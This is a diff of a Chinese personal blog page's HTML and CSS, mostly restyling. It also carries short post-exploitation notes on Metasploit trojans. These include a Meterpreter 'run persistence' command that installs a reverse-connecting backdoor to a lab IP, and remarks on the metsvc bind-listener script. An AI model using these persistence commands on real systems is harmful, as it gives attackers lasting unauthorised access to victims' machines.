@@ -19,13 +19,13 @@
             line-height: 1.5;
             color: rgb(0, 0, 0);
             border: 0;
-            font-size: 100%;
             background-color: rgba(255, 255, 255, 0.70);
             max-width: 896px;
             padding: 0 2px;
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.65);
             padding: 0 27px 27px;
             overflow: auto;
+            font-size: 1.125em
         }
         #title{
             line-height: 2;
@@ -79,7 +79,7 @@
             width: 36%;
             max-width: 360px;
         }
-        #article{
+        .content{
             border-radius: 27px;
             margin: 0 20px 0 20px;
 /*            min-width: 896px; */
@@ -89,7 +89,7 @@
             padding: 30px;
             border-radius: 15px;
         }
-        .highlight{
+/*         .highlight{
             background: #2d2d2d;
             margin: 0 -20px;
             padding: 15px 20px;
@@ -99,7 +99,7 @@
             overflow: auto;
             color: #ABB2BF;
             line-height: 22px;
-        }
+        } */
         .sidebar_title{
             line-height: 1.5;
             box-sizing: border-box;
@@ -129,30 +129,10 @@
             text-align: center;
             display: block;
         }
-        /*高亮*/
-        .code{
-            border:none;
-        }
-        /* code行号字体颜色 */
-        span.line{
-            color: #666;
-            margin: 0 9px;
-            font-size: 0.5em;
-            line-height: 2.55em;
-        }
-        /* code主体字体颜色 */
-        code.plaintext{
-            color: #ABB2BF;
-            line-height: 1.25em;
-            font-size: 1em;
-        }
-        /* hljs的配色背景删掉 */
-        .hljs{
-            background-color:rgba(0, 0, 0, 0);
-        }
-        /* hljs的padding */
-        pre code.hljs{
-            padding: 0;
+
+        /* 文字颜色 */
+        html, body, span, p, h1, h2, h3, h4, h5, h6 {
+            color: #2e405b;
         }
     </style>
     <body>
@@ -214,11 +194,12 @@
         <!-- 主体 -->
         <div id='main'>
             <!--文章-->
-            <div class='content' id='article'>
+            <div class='content'>
                 <p id='title'>msf木马实用操作</p>
                 <div id='date'>2021-08-02</div>
                 <hr>
-                <p>后渗透阶段的简单笔记….TBC</p>
+                <div id='article'>
+                    <p>后渗透阶段的简单笔记….TBC</p>
 <span id="more"></span>
 
 <ul>
@@ -231,6 +212,7 @@
 <p>例子:<br><code>run persistence -S -U -X -i 5 -p 6666 -r 192.168.190.141</code><br>注意,这个脚本生成的木马 <em>貌似/好像/大概/也许</em> 是一个16位的程序…最高也只能在32位系统里运行,<br>对于64位系统,可以自行再生成一个msf木马upload到靶机上去,一般情况下,其木马所在位置会在执行这个脚本时输出</p>
 <h3 id="权限维持俩脚本之metsvc"><a href="#权限维持俩脚本之metsvc" class="headerlink" title="权限维持俩脚本之metsvc"></a>权限维持俩脚本之metsvc</h3><p>emmm,我不是很推荐用这个,这个脚本不是反向连接的,会在目标机上监听一个端口,随便一个谁去连接都是直接拿到权限,包括各种安全扫描工具…..</p>
 
+                </div>
                 <br><br><br>
                 <script src="https://giscus.app/client.js"
                     data-repo="smyhw/blog.smyhw.online"
@@ -252,11 +234,11 @@
                     flex-direction: column;
                     justify-content: center;
                 '>
-                    <img style='margin: 0px 75px 10px;' src='/images/awa.png'>
+                    <img style='margin: 0px 75px 10px;  max-width: 150px;' src='/images/awa.png'>
                     <hr>
                     <p style='margin:0 auto;font-size: 2em;'>smyhw</p>
                     <hr>
-                    <p style='margin:0 auto;'>emmmm,大概已经是一条咸鱼了qwq...</p>
+                    <p style='margin:0 auto;'>大概已经是一条咸鱼了qwq...</p>
                 </div>
                 <div class='content sidebar_item'>
                     <p class='sidebar_title'>页面</p>
@@ -265,7 +247,7 @@
                     <a target="_blank"  href=''></a><br>
                     <a target="_blank"  href=''></a><br>
                 </div>
-                <div class='content sidebar_item'>我也不知道这里该放什么[・ヘ・?]<br>所以就放个占位符好了(｀・ω・´)
+                <div class='content sidebar_item'>我也不知道该放什么[・ヘ・?]<br>就放个占位符好了(｀・ω・´)
                 
                 </div>
             </div>
